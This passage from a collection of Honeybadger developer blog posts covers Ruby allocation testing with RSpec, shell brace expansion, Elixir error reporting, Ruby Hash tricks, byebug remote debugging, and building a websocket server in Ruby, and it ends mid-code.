garbage collection, etc. Some of these include ruby-prof , stackprof and allocation_tracer . I've recently been using allocation_stats to profile object allocations. Reducing allocations is a fairly easy task to accomplish, yielding a lot of low-hanging fruit for tuning memory consumption and speed. For example, here's a basic Ruby class which stores an Array of 5 strings which default to 'foo': class MyClass def initialize @values = Array . new ( 5 ) 5 . times { @values << 'foo' } end end The AllocationStats API is simple. Give it a block to profile, and it will print out where the most objects are allocated. $ ruby -r allocation_stats -r ./lib/my_class\nstats = AllocationStats.trace { MyClass.new } puts stats.allocations ( alias_paths: true ) .group_by ( :sourcefile, :sourceline, :class ) .to_text\n^D\n     sourcefile        sourceline   class   count --------------------- ---------- ------- ----- /lib/my_class.rb           4       String       5\n/lib/my_class.rb           3       Array        1\n-                          1       MyClass      1 The #to_text method (called on a group of allocations) simply prints out a nice human-readable table grouped by whatever criteria you ask for. This output is great when profiling manually, but my goal was to create a test which could run alongside my normal unit test suite (which is written in RSpec).We can see that on line 4 of my_class.rb, 5 strings are being allocated, which seems unnecessary since I know they all contain the same value. I wanted my scenario to read something like: \"when initializing MyClass it allocates under 6 objects\". In RSpec this looks something like: describe MyClass do context \"when initializing\" do specify { expect { MyClass . new }. to allocate_under ( 6 ). objects } end end Using this syntax I have everything I need to test that object allocations are less than a given number for the described block of code (inside the expect block) using a custom RSpec matcher. In addition to printing the trace results, AllocationStats provides a few methods for accessing the allocations via Ruby, including #allocations and #new_allocations . These are what I used to build my matcher: begin require 'allocation_stats' rescue LoadError puts 'Skipping AllocationStats.' end RSpec :: Matchers . define :allocate_under do | expected | match do | actual | return skip ( 'AllocationStats is not available: skipping.' ) unless defined? ( AllocationStats ) @trace = actual . is_a? ( Proc ) ? AllocationStats . trace ( & actual ) : actual @trace . new_allocations . size < expected end def objects self end def supports_block_expectations? true end def output_trace_info ( trace ) trace . allocations ( alias_paths: true ). group_by ( :sourcefile , :sourceline , :class ). to_text end failure_message do | actual | \"expected under #{ expected } objects to be allocated; got #{ @trace . new_allocations . size } : \\n\\n \" << output_trace_info ( @trace ) end description do \"allocates under #{ expected } objects\" end end I'm rescuing LoadError in the initial require statement because I may not want to include AllocationStats on every test run (it tends to slow down the tests). I then define the :allocate_under matcher which performs the trace inside of the match block. The failure_message block is also important because it includes the to_text output from the AllocationStats trace right inside my failure message ! The rest of the matcher is mostly standard RSpec configuration. With my matcher loaded, I can now run my scenario from before, and watch it fail: $ rspec spec / my_class_spec . rb MyClass when initializing should allocates under 6 objects ( FAILED - 1 ) Failures : 1 ) MyClass when initializing should allocates under 6 objects Failure / Error : expect { MyClass . new }. to allocate_under ( 6 ). objects expected under 6 objects to be allocated ; got 7 : sourcefile sourceline class count --------------------------- ---------- ------- ----- < PWD > /spec/m y_class_spec . rb 6 MyClass 1 < PWD > /lib/m y_class . rb 3 Array 1 < PWD > /lib/m y_class . rb 4 String 5 # ./spec/my_class_spec.rb:6:in `block (3 levels) in <top (required)>' Finished in 0.15352 seconds ( files took 0.22293 seconds to load ) 1 example , 1 failure Failed examples: rspec . / spec / my_class_spec . rb : 5 # MyClass when initializing should allocates under 6 objects OK, so I've programmatically demonstrated the performance problem, which is that MyClass allocates extra string objects with the same value. Let's fix that issue by throwing those values into a frozen constant: class MyClass DEFAULT = 'foo' . freeze def initialize @values = Array . new ( 5 ) 5 . times { @values << DEFAULT } end end Now that I've fixed the issue, I'll run my test again and watch it pass: $ rspec spec/my_class_spec.rb\n\nMyClass\n  when initializing\n    should allocates under 6 objects\n\nFinished in 0.14952 seconds ( files took 0.22056 seconds to load ) 1 example, 0 failures Next time I change the MyClass#initialize method, I can be confident that I'm not allocating too many objects. Because profiling allocations can be relatively slow, it would be ideal to run these on-demand rather than all the time. Because I'm already gracefully handling allocation_stats being missing, I can use Bundler to create multiple gemfiles and then specify which gemfile I want to use with the BUNDLE_GEMFILE environment variable: $ BUNDLE_GEMFILE = with_performance.gemfile bundle exec rspec spec/ $ BUNDLE_GEMFILE = without_performance.gemfile bundle exec rspec spec/ Another option is to use a library like the appraisal gem , which takes this same approach and solves some Bundler gotchas. Jason Clark gave an excellent presentation on how to do this at Ruby on Ales in March 2015; check out his slides to learn more . I also think that maintaining these types of tests separately from my normal unit tests is a good idea, so I'll create a new \"performance\" directory so that my unit test suite resides in spec/unit/ and my performance suite resides in spec/performance/: spec / |-- spec_helper . rb |-- unit / |-- features / |-- performance / I am still refining my approach to profiling Ruby code for performance; my hope is that maintaining a performance test suite will help me improve the speed of my code now, keep it fast in the future, and create documentation for myself and others.", "date": "2015-04-02"},
{"website": "Honey-Badger", "title": "Move a file in *nix without retyping whole path", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/command-line-tip-brace-expansion/", "abstract": "If you've been using the Unix/Linux command line for any length of time, you're certainly familiar with time-saving techniques like tab completion and reverse-i-search. Chances are you use these darling keystroke-savers daily. These features of course make a ton of sense—why should *nix force you through the unbearable tedium of typing a full directory name when the computer is perfectly capable of guessing what you're about to type? Well, today I'm about to (hopefully) blow your mind with another time-saver of whose existence you might not have been aware. It's called brace expansion . The problem Tell me if this looks familiar: you want to make just a minor change to a filename, but since the file is so deeply nested in your directory structure, you have to type SO...MUCH...STUFF just to slap a few characters onto the beginning: mv app/views/appointments/_services.html.erb app/views/appointments/_service_list.html.erb Totally un-DRY. The solution Thanks to brace expansion, you can type only the unique parts. The following command is functionally equivalent to the first one: mv app/views/appointments/{_services.html.erb,_service_list.html.erb} Isn't that wonderful? Go ahead and pop open a console right now to try it out. It's an absolute delight. It works everywhere The utility of brace expansion is not limited to the mv command. You can use it with cp or anywhere else you think makes sense. If you're a Vim user, you can try something like this, which will open three files in tabs: vi -p app/views/appointments/{new.html.erb,edit.html.erb,show.html.erb} In addition to useful things you can do silly things: touch file{1..5}.html Why would you ever want to do that? I don't know, but you can! That's it. Hopefully that seems useful. You'll thank me when you're 90 years old and thinking back to all the wonderful things you did with those extra 12 minutes you saved over the years, courtesy of brace expansion.", "date": "2013-11-05"},
{"website": "Honey-Badger", "title": "Introducing Honeybadger for Elixir", "author": ["Richard Bishop"], "link": "https://www.honeybadger.io/blog/introducing-honeybadger-for-elixir/", "abstract": "We are excited to share that you can now send exception information from your Elixir applications to Honeybadger! installation and configuration are very straight forward so we're only going to look at how you use the Honeybadger package. Let's dive in and see how easy this is to get set up. Phoenix Applications There are many things to like about Phoenix but one of the very best is that core to Phoenix's design is staying close to the Plug virtue of functions. Since Phoenix is so close to Plug, we can easily notify Honeybadger of any exceptions in your Phoenix application's web requests. Just use the Honeybadger.Plug module in your Phoenix application's router and you're done! defmodule MyApp . Router do use MyApp . Web , :router use Honeybadger . Plug pipeline :browser do ... end pipeline :api do ... end end For debugging and customer experience purposes it can also be really helpful to send extra information about the request along with the exception. We provide the Honeybadger.context/1 function to accomplish this. A great technique is to add a plug function that sets up the context for a request. # in your application's router plug :set_honeybadger_context def set_honeybadger_context ( conn , opts ) do user_id = current_user ( conn ) context = %{user_id: user_id, account: user.account_id} Honeybadger . context ( context ) conn end OTP Processes Sometimes we have work that needs to be done outside of the web process so that we can return a response as fast as possible. Examples of this are sending email or updating third party APIs. If you follow the guidelines of OTP architecture then Honeybadger rewards you. Any process that conforms to SASL error reporting requirements and crashes will send an error message to the logger. Examples of these process types are GenServers, GenEvents, Supervisors, and any processes spawned using proc_lib such as Tasks. This will be nearly all of the processes you have in any given application. Simply set use_logger to true when configuring Honeybadger and we will automatically take care of notifying Honeybadger of these crashes. Manual Error Handling While Elixir users inherit the Let It Crash mantra from our Erlang ancestors, the often untold, unsexy part of this is that we need to observe, understand and react to how our applications fail. Sometimes we have critical code paths that need to succeed. If they don't, we need to know why. You can manually call Honeybadger.notify to support these cases. require Honeybadger try do File . read! ( \"i_dont_exist\" ) rescue ex -> context = %{user_id: 1} Honeybadger . notify ( ex , context ) end As a side note, the reason you need to require the Honeybadger module before calling Honeybadger.notify is because this function is actually a macro. With the power of a macro we can wipe away the function calls to notify in environments that you aren't interested in having exception tracking, such as test and development. Pretty cool, eh?! Conclusion At ElixirConf Europe Michael Schäfermeyer gave an excellent talk on using Elixir in a high scale web application . One of the key takeaways from that talk for me was that Elixir is missing some of the tools we might be accustomed to in other languages. We hope that by supporting exception tracking for Elixir applications we are doing our part to help get the Elixir community one step closer.", "date": "2015-08-31"},
{"website": "Honey-Badger", "title": "Honeybadger now supports causes / nested exceptions", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/honeybadger-now-supports-causes-nested-exceptions/", "abstract": "What happens when you rescue an exception and re-raise another one? It used to be that the original exception was lost forever. But since Ruby 2.1, you can access these nested exceptions via the cause method. I've already published a more detailed look at causes , but for now a simple example will work. In the code below we raise three nested exceptions, then use the Exception#cause method to access them. def caused_exception begin begin raise RuntimeError . new ( \"This is the root cause raised at #{ Time . now } \" ) rescue raise RuntimeError . new ( \"This is the second cause raised at #{ Time . now } \" ) end rescue raise RuntimeError . new ( \"This is the third cause raised at #{ Time . now } \" ) end end begin caused_exception rescue => e puts e # This is the third cause raised at 2015-08-04 10:07:11 -0700 puts e . cause # This is the second cause raised at 2015-08-04 10:07:11 -0700 puts e . cause . cause # This is the root cause raised at 2015-08-04 10:07:11 -0700 end Viewing causes in Honeybadger As of today, any error reported to Honeybadger will have its cause information attached. You'll find it right underneath the main backtrace in a section titled \"Nested Exceptions\". The only thing you need to do is to make sure that you're running the latest version of our gem. Here's what the exception shown above would look like: Each cause has its own separate backtrace which you can expand by clicking. You have direct links to your git repo and to open the file in a local editor, just like the \"normal\" backtrace.", "date": "2015-08-05"},
{"website": "Honey-Badger", "title": "Introducing our new search query builder", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/new-search-query-builder/", "abstract": "If you're a regular Honeybadger user, you may have noticed that search looks a little different. We recently \nlaunched a new query builder that not only looks better, but also makes it a snap to construct the kinds of \nadvanced search queries that let you dig down to find exactly the errors you're looking for. Here's what it looks like: The back-story Honeybadger's search back-end is pretty powerful, and has been for some time. Of course you can search for errors by name\nand message, but you can also find errors that affected a specific user, or that happened in a certain piece of code. But it\nwas a pain in the neck to use. You had to dig through our docs, learn our query syntax and manually type in queries like occurred:[NOW-1DAY to NOW] -is:ignored . The new search builder makes it much easier. Just click on the search box and you'll be presented with a palette of attributes to search for. Click on an attribute like \"assignee\" and you'll be shown a menu of possible choices. Click on a date attribute and you'll be shown a calendar. If you prefer to type, we've also got you covered with features like auto-complete, and tab navigation between search terms. The future We're not done yet. We want to use auto-complete in more places. And we want to make the experience of looking for specific error \noccurrences easier, possibly brining the search bar into the error details page so you can filter occurrences for a single error.", "date": "2017-11-02"},
{"website": "Honey-Badger", "title": "Advanced Ruby Hash Techniques", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/advanced-ruby-hash-techniques/", "abstract": "When you use something as much as Ruby developers use Hashes, it's easy to think you've seen it all. But I'm here to tell you that the humble ruby Hash has a few tricks up its sleeve. Far from being a dumb key-value system, the Hash object gives you the power to do some very interesting and sophisticated things. Any object can be a hash key Before we go any farther I'd like to point out one thing that may not be obvious. While we tend to use strings and symbols as hash keys, that doesn't mean we can't use other kinds of objects as well. In fact, you can use almost anything as a hash key. # Numbers can be hash keys { 1 => \"one\" }[ 1 ] # \"one\" # So can the Ruby kernel { Kernel => 1 }[ Kernel ] # 1 # You can store values for specific classes { Kernel => 1 , String => 2 }[ \"hello world\" . class ] # 2 # You can store values for booleans { true => \"verdad\" }[ 1 == 1 ] # \"verdad\" # You can even use complex arrays and even other hashes as hash keys {[[ 1 , 0 ],[ 0 , 1 ]] => \"identity matrix\" }[[[ 1 , 0 ], [ 0 , 1 ]]] # \"identity matrix\" Some of these options are more useful than others, but they're all available to you. You have control over the default value. Suppose you have a hash h={ a: 1 } . If you try to access a value that doesn't exist - for example h[:x] - you get nil. That's because nil is the default value of every hash, unless you specify otherwise. You can set the default value for a new hash by passing an argument into its constructor. h = Hash . new ( \"This attribute intentionally left blank\" ) h [ :a ] = 1 h [ :a ] # 1 h [ :x ] # \"This attribute intentionally left blank\" Dynamic default values Pay attention, because this is trick is the foundation of everything that follows. If you pass a block into the constructor, you can generate default values programmatically. In the example below I've added a timestamp to the default value, so you can see that it's being dynamically generated. h = Hash . new { | hash , key | \" #{ key } : #{ Time . now . to_i } \" } h [ :a ] # \"a: 1435682937\" h [ :a ] # \"a: 1435682941\" h [ :b ] # \"b: 1435682943\" This is important because the \"default value\" block can do things other than return a default value. Raising an exception if a hash key isn't present One of the main problems with hashes is that they fail silently. You accidentally type in user[:phnoe] instead of user[:phone] , and instead of raising an exception, the hash returns nil. But you can change this behavior. h = Hash . new { | hash , key | raise ArgumentError . new ( \"No hash key: #{ key } \" ) } h [ :a ] = 1 h [ :a ] # 1 h [ :x ] # raises ArgumentError: No hash key: x This technique can be useful for debugging and refactoring because it applies to a specific hash. It's a much less intrusive way to add this behavior than something like monkey-patching the Hash class would be. Note: I'm not suggesting that anyone use this in place of Hash.fetch in new code. It's just an interesting trick to have up your sleeve for debugging and refactoring. Lazily-generated lookup tables This technique useful for caching the results of a computation. Imagine that you need to calculate a lot of square roots. You could create a lazily-populated lookup table like the example below. sqrt_lookup = Hash . new { | hash , key | hash [ key ] = Math . sqrt ( key ) } sqrt_lookup [ 9 ] # 3.0 sqrt_lookup [ 7 ] # 2.6457513110645907 sqrt_lookup # {9=>3.0, 7=>2.6457513110645907} Recursive lazy lookup tables Suppose you have a recursive function and you want to cache the result of each recursion. Let's take a factorial calculation as an example. \"Four factorial\", aka \"4!\" is just another way of saying \"4x3x2x1.\" You could implement this recursively using a hash. The example below, which I've taken from this blog post demonstrates it nicely: factorial = Hash . new do | h , k | if k > 1 h [ k ] = h [ k - 1 ] * k else h [ k ] = 1 end end factorial [ 4 ] # 24 factorial # {1=>1, 2=>2, 3=>6, 4=>24} Modifying defaults after initialization You can also control the default value after a hash has been created. To do this use the default and default_proc setters. h = {} h [ :a ] # nil h . default = \"new default\" h [ :a ] # \"new default\" h . default_proc = Proc . new { Time . now . to_i } h [ :a ] # 1435684014 Find the Ruby: A game of lazily infinite nested hashes Just for fun, let's wrap all of these useful techniques into one extremely useless example. Remember that old text-based game Adventure? Let's build the stupidest version of it ever. Imagine you're in a cave. You can go north, south, east or west. Three of these choices take you to a new \"room\" of the cave where you keep exploring. But one choice leads you to a \"ruby.\" Hence the name of the game: \"find the ruby.\" Each room in the cave corresponds to a hash. The hash only has one entry. One of [\"n\", \"s\", \"e\", \"w\"] chosen at random, has the value \"You found the ruby.\"  If you choose incorrectly a new hash is created and added to the tree. generator = Proc . new do | hash , key | hash [ key ] = Hash . new ( & generator ). merge ([ \"n\" , \"s\" , \"e\" , \"w\" ][ rand ( 4 )] => \"You found the ruby!\" ) end dungeon = Hash . new ( & generator ) dungeon [ \"n\" ] # <Hash ... dungeon [ \"n\" ][ \"s\" ] # <Hash ... dungeon [ \"n\" ][ \"s\" ][ \"w\" ] # \"You found the ruby!\"", "date": "2015-06-30"},
{"website": "Honey-Badger", "title": "Remote Debugging with Byebug, Rails and Pow", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/remote-debugging-with-byebug-rails-and-pow/", "abstract": "If you haven't seen byebug before, I recommend that you check it out. It's a great debugger for Ruby 2.x. In the words of its authors: Byebug is a simple to use, feature rich debugger for Ruby 2. It uses the new TracePoint API for execution control and the new Debug Inspector API for call stack navigation, so it doesn't depend on internal core sources. It's developed as a C extension, so it's fast. And it has a full test suite so it's reliable. The basic setup is pretty simple. Just install the gem. If you use the byebug method anywhere in your code, execution will stop at that point and you'll be dropped into a debug console. You can ever set it up to use pry. For example, I could invoke the debugger like so: require 'byebug' def my_method a = 1 byebug end my_method () If I run that file, I get dropped into the debugger. When the debugger is triggered, it drops you into an interactive shell. The problem with Pow That's fine if you can run you app on the command line. But what if you're developing a Rails app using pow to serve it locally? Pow, like most app servers, runs in the background. So even if you did manage to stop execution and run the debugger, you wouldn't be able to interact with it! Fortunately, byebug provides a mechanism for remote debugging. If you're not familiar with remote debugging, it's a simple concept. When the byebug method is called, instead of dumping you to an interactive shell, the debugger fires up its own special server. You can then connect to this debug server using a command-line client. What does remote debugging look like? First, I call the byebug method to a controller action class PagesController < ApplicationController def index if user_has_never_signed_in? && request . subdomain == \"www\" @hero_bg = ab_test ( \"hero_bg\" , \"control\" , \"variable\" ) else @hero_bg = \"control\" end byebug end end Second, I make a request to that action. The connection appears to hang. A web request that triggers the debugger doesn't load Finally, I switch over to my byebug client, which is showing a debugger console at exactly the point I specified. The byebug remote debugger in action Setting up remote debugging with byebug If you don't already have the gem installed, go ahead and install it. # Gemfile gem \"byebug\" , group: \"development\" Next, we need to add an initializer to our rails app that starts up the byebug server whenever pow starts our rails app. The only real option you need to provide is a port number. The code below lets you configure that via an environment variable. Once you add this initializer, you'll probably need to to restart the app make sure that it's been loaded. # config/initializers/byebug.rb if Rails . env . development? Byebug . start_server 'localhost' , ENV . fetch ( \"BYEBUG_SERVER_PORT\" , 1048 ). to_i end Finally, you'll need to run the byebug client and tell it where to find our server. The client will then sit and wait for a debug trigger to occur. If you used a different port, you'll need to substitute that here. bundle exec byebug -R localhost:1048 That's it! Time to start debuggin'.", "date": "2015-07-15"},
{"website": "Honey-Badger", "title": "Announcing Search Autocomplete", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/announcing-search-auto-completion/", "abstract": "Stop the presses! We've just added a small but really cool new feature to your Honeybadger account: search key autocomplete. You've always been able to search your errors by params, session and other nested fields. It's easy to find all errors where params.user.name is bob . But there's a catch. You had to know beforehand that params.user.name exists, and you had to type it in manually. This made it really difficult to do on-the-fly exploratory searches. With our new search key autocomplete feature, you no longer have to remember arcane nested key names. Just start typing and we'll give you a list of keys to choose from. It even works with nested keys like context.user.name.first , allowing giving you a menu of choices at each level of nesting.", "date": "2019-01-28"},
{"website": "Honey-Badger", "title": "Building a simple websockets server from scratch in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/building-a-simple-websockets-server-from-scratch-in-ruby/", "abstract": "Websockets are getting more and more press these days. We hear that they're \"the future.\" We hear that they're easier to use than ever thanks to ActionCable in Rails 5. But what exactly ARE websockets? How do they work? In this post we're going to answer these questions by building a simple WebSocket server from scratch in Ruby. When we're done we'll have achieved bi-directional communication between a browser and our server. The code in this post is meant as a learning exercise. If you want to implement websockets in a real production app, check out the excellent websocket-ruby gem. You might also take a look at the WebSocket Spec . So you've never heard of websockets Web sockets were invented to solve some problems inherent in normal HTTP connections. When you request a webpage using a normal HTTP connection, the server sends you the content and then closes the connection. If you want to request another page, you have to make another connection. This normally works fine, but it's not the best approach for some use cases: For some applications, like chat, the front end needs to be updated as soon as a new message comes in. If all you have is normal HTTP requests, that means that you have to continuously poll the server to see if there is new content. If your front-end application needs to make lots of small request to the server, the overhead of creating new connections for each request can become a performance issue. This is less of a problem in HTTP2. With Web sockets, you make one connection to the server which is then held open and used for bidirectional communication. Client side Web sockets are normally used for communication between a browser and a Web server. The browser side is implemented in JavaScript. In the example below I've written a very simple piece of JavaScript to open a Web socket to my local server and send a message to it. <!doctype html> <html lang= \"en\" > <head> <title> Websocket Client </title> </head> <body> <script> var exampleSocket = new WebSocket ( \" ws://localhost:2345 \" ); exampleSocket . onopen = function ( event ) { exampleSocket . send ( \" Can you hear me? \" ); }; exampleSocket . onmessage = function ( event ) { console . log ( event . data ); } </script> </body> </html> If I start up a little static server and open this file in my web browser, I get an error. That makes sense, because there is no server yet. We still have to build one. :-) Beginning the server Web socket start out life as normal HTTP requests. They have kind of an odd lifecycle: The browser sends a normal HTTP request, with some special headers that say \"please make me a websocket.\" The server replies with a certain HTTP response, but DOESN'T CLOSE THE CONNECTION. The browser and server then use a special websocket protocol to exchange frames of data over the open connection. So the first step for us is to build a Web server. In the code below, I'm creating the simplest possible web server. It doesn't actually serve anything. It simply waits for a request then prints it to STDERR. require 'socket' server = TCPServer . new ( 'localhost' , 2345 ) loop do # Wait for a connection socket = server . accept STDERR . puts \"Incoming Request\" # Read the HTTP request. We know it's finished when we see a line with nothing but \\r\\n http_request = \"\" while ( line = socket . gets ) && ( line != \" \\r\\n \" ) http_request += line end STDERR . puts http_request socket . close end If I run the server, and refresh my websocket testing page, I get this: $ ruby server1.rb\nIncoming Request\nGET / HTTP/1.1\nHost: localhost:2345\nConnection: Upgrade\nUpgrade: websocket\nSec-WebSocket-Version: 13\nSec-WebSocket-Key: cG8zEwcrcLnEftn2qohdKQ== If you'll notice, this HTTP request has a bunch of headers that related to Web sockets. This is actually the first step in the websocket handshake The handshake All Web socket requests start out with a handshake. This is to make sure that both the client and the server both understand that Web sockets are about to happen and they both agree on the protocol version. It works like this: Client sends a HTTP request like this GET / HTTP/1.1\nHost: localhost:2345\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: E4i4gDQc1XTIQcQxvf+ODA==\nSec-WebSocket-Version: 13 The most important part of this request is the Sec-WebSocket-Key .  The client expects the server to return a modified version of this value as proof against XSS attacks and caching proxies. Server responds HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: d9WHst60HtB4IvjOVevrexl0oLA= The server response is boilerplate except for the Sec-WebSocket-Accept header. This header is generated like so: # Take the value provided by the client, append a magic # string to it. Generate the SHA1 hash, then base64 encode it. Digest :: SHA1 . base64digest ([ sec_websocket_accept , \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\" ]. join ) Your eyes are not lying to you. There is a magic constant involved. Implementing the handshake Let's update our server to complete the handshake. First, we'll pull the security token out of the request headers: # Grab the security key from the headers. # If one isn't present, close the connection. if matches = http_request . match ( /^Sec-WebSocket-Key: (\\S+)/ ) websocket_key = matches [ 1 ] STDERR . puts \"Websocket handshake detected with key: #{ websocket_key } \" else STDERR . puts \"Aborting non-websocket connection\" socket . close next end Now, we use the security key to generate a valid response: response_key = Digest :: SHA1 . base64digest ([ websocket_key , \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\" ]. join ) STDERR . puts \"Responding to handshake with key: #{ response_key } \" socket . write <<- eos HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: #{ response_key } eos STDERR . puts \"Handshake completed.\" When I refresh the websocket test page, I see now that there's no longer a connection error. The connection was established! Here's the output from the server, showing the security keys and the response key: $ ruby server2.rb\nIncoming Request\nWebsocket handshake detected with key: Fh06+WnoTQQiVnX5saeYMg==\nResponding to handshake with key: nJg1c2upAHixOmXz7kV2bJ2g/YQ=\nHandshake completed. The websocket frame protocol Once a WebSocket connection is established, HTTP is no longer used. Instead, data is exchanged via the WebSocket protocol. Frames are the basic unit of the WebSocket protocol. The WebSocket protocol is frame-based. But what does this mean? Whenever you ask your web browser to send data over WebSocket, or ask your server to respond, the data is broken up into a series of chunks in each of those chunks is wrapped in some metadata to make a frame. Here's what the frame structure looks like. The numbers along the top are bits. And some of the fields, like extended payload length may not always be present: 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-------+-+-------------+-------------------------------+\n|F|R|R|R| opcode|M| Payload len |    Extended payload length    |\n|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |\n|N|V|V|V|       |S|             |   (if payload len==126/127)   |\n| |1|2|3|       |K|             |                               |\n+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +\n|     Extended payload length continued, if payload len == 127  |\n+ - - - - - - - - - - - - - - - +-------------------------------+\n|                               |Masking-key, if MASK set to 1  |\n+-------------------------------+-------------------------------+\n| Masking-key (continued)       |          Payload Data         |\n+-------------------------------- - - - - - - - - - - - - - - - +\n:                     Payload Data continued ...                :\n+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +\n|                     Payload Data continued ...                |\n+---------------------------------------------------------------+ The first thing that may jump out at you is that this is a binary protocol. We're going to have to do some bit manipulation, but don't worry — it won't be that hard. The numbers along the top of the figure are bits. And some of the fields may not always be present. For example the extended payload length will be present if the payload is under 127 bytes. Receiving data Now their handshake is complete, we can start parsing the binary frame. To keep things simple, we're going to look at the incoming frame one byte at a time. After that, we'll put it all together so you can see it in action. Byte 1: FIN and Opcode From the table above, you can see that the first byte (the first eight bits) contains a few pieces of data: FIN: 1 bit If this is false, then the message is split into multiple frames opcode: 4 bits Tells us if the payload is text, binary, or if this is just a \"ping\" to keep the connection alive. RSV: 3 bits These are unused in the current WebSockets spec. To get the first byte, we'll use the IO#getbyte method. And to extract the data, we'll use some simple bitmasking. If you're not familiar with bitwise operators, check out my other article Bitwise hacks in Ruby first_byte = socket . getbyte fin = first_byte & 0b10000000 opcode = first_byte & 0b00001111 # Our server will only support single-frame, text messages. # Raise an exception if the client tries to send anything else. raise \"We don't support continuations\" unless fin raise \"We only support opcode 1\" unless opcode == 1 Byte 2: MASK and payload length The second byte of the frame contains more information about the payload. MASK: 1 bit Boolean flag indicating if the payload is masked. If it's true, then the payload will have to be \"unmasked\" before use. This should ALWAYS be true for frames coming in from our client. The spec says so. payload length: 7 bits If our payload is less than 126 bytes, the length is stored here. If this value is greater than 126, that means more bytes will follow to give us the length. Here's how we handle the second byte: second_byte = socket . getbyte is_masked = second_byte & 0b10000000 payload_size = second_byte & 0b01111111 raise \"All frames sent to a server should be masked according to the websocket spec\" unless is_masked raise \"We only support payloads < 126 bytes in length\" unless payload_size < 126 STDERR . puts \"Payload size: #{ payload_size } bytes\" Bytes 3-7: The masking key We expect that the payloads of all incoming frames will be masked. To unmask the content, we will have to XOR it against a masking key. This masking key makes up the next four bytes. We don't have to process it at all, we just read the bytes into an array. mask = 4 . times . map { socket . getbyte } STDERR . puts \"Got mask: #{ mask . inspect } \" Please tell me if you know of a nicer way to read 4 bytes into an array. The times.map is a little strange, but it was the most concise approach I could think of. I'm @StarrHorne on twitter. Bytes 8 and up: The payload Okay, we're done with metadata. Now can fetch the actual payload. data = payload_size . times . map { socket . getbyte } STDERR . puts \"Got masked data: #{ data . inspect } \" Remember that this payload is masked. So if you print it out, it will look like garbage. To unmask it, we simply XOR each byte with the corresponding byte of the mask. Since the mask is only four bytes long, we repeat it to match the length of the payload: unmasked_data = data.each_with_index.map { |byte, i| byte ^ mask[i % 4] }\nSTDERR.puts \"Unmasked the data: #{ unmasked_data.inspect }\" Now we have an array of bytes. We need to convert that into a unicode string. All text in Websockets is unicode. STDERR.puts \"Converted to a string: #{ unmasked_data.pack('C*').force_encoding('utf-8').inspect }\" Putting it all together When you put all of this code together, you get a script that looks like this: require 'socket' # Provides TCPServer and TCPSocket classes require 'digest/sha1' server = TCPServer . new ( 'localhost' , 2345 ) loop do # Wait for a connection socket = server . accept STDERR . puts \"Incoming Request\" # Read the HTTP request. We know it's finished when we see a line with nothing but \\r\\n http_request = \"\" while ( line = socket . gets ) && ( line != \" \\r\\n \" ) http_request += line end # Grab the security key from the headers. If one isn't present, close the connection. if matches = http_request . match ( /^Sec-WebSocket-Key: (\\S+)/ ) websocket_key = matches [ 1 ] STDERR . puts \"Websocket handshake detected with key: #{ websocket_key } \" else STDERR . puts \"Aborting non-websocket connection\" socket . close next end response_key = Digest :: SHA1 . base64digest ([ websocket_key , \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\" ]. join ) STDERR . puts \"Responding to handshake with key: #{ response_key } \" socket . write <<- eos HTTP/1.1 101 Switching Protocols\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Accept: #{ response_key } eos STDERR . puts \"Handshake completed. Starting to parse the websocket frame.\" first_byte = socket . getbyte fin = first_byte & 0b10000000 opcode = first_byte & 0b00001111 raise \"We don't support continuations\" unless fin raise \"We only support opcode 1\" unless opcode == 1 second_byte = socket . getbyte is_masked = second_byte & 0b10000000 payload_size = second_byte & 0b01111111 raise \"All incoming frames should be masked according to the websocket spec\" unless is_masked raise \"We only support payloads < 126 bytes in length\" unless payload_size < 126 STDERR . puts \"Payload size: #{ payload_size } bytes\" mask = 4 . times . map { socket . getbyte } STDERR . puts \"Got mask: #{ mask . inspect } \" data = payload_size . times . map { socket . getbyte } STDERR . puts \"Got masked data: #{ data . inspect } \" unmasked_data = data . each_with_index . map { | byte , i | byte ^ mask [ i % 4 ] } STDERR . puts \"Unmasked the data: #{ unmasked_data . inspect } \" STDERR . puts \"Converted to a string: #{ unmasked_data . pack ( 'C*' ). force_encoding ( 'utf-8' ). inspect } \" socket . close end When I refresh my WebSocket tester webpage and it makes a request to my server, here's the output that I see: $ ruby websocket_server.rb\nIncoming Request\nWebsocket handshake detected with key: E4i4gDQc1XTIQcQxvf+ODA==\nResponding to handshake with key: d9WHst60HtB4IvjOVevrexl0oLA=\nHandshake completed. Starting to parse the websocket frame.\nPayload size: 16 bytes\nGot mask: [80, 191, 161, 254]\nGot masked data: [19, 222, 207, 222, 41, 208, 212, 222, 56, 218, 192, 140, 112, 210, 196, 193]\nUnmasked the data: [67, 97, 110, 32, 121, 111, 117, 32, 104, 101, 97, 114, 32, 109, 101, 63]\nConverted to a string: \"Can you hear me?\" Sending data back to the client So we've successfully sent a test message from our client to our toy WebSocket server. Now it would be cool to send a message back from the server to the client. This is a little less involved, as we don't have to deal with any of the masking stuff. Frames sent from server to client are always unmasked. Just like we consumed the frame one byte at a time, we're going to construct it one byte at a time. Byte 1: FIN and opcode Our payload is going to fit into one frame, and it's going to be text. That means that FIN will equal 1, and the opcode also equals one. When I combine those using the same bit format that we used before, I get a number: output = [ 0b10000001 ] Byte 2: MASKED and payload length Because this frame is going from the server to the client, MASKED will equal zero. That means that we can ignore it. The payload length is just the length of the string. output = [ 0b10000001 , response . size ] Bytes 3 and up: The payload The payload is not masked, it's just a string. response = \"Loud and clear!\" STDERR . puts \"Sending response: #{ response . inspect } \" output = [ 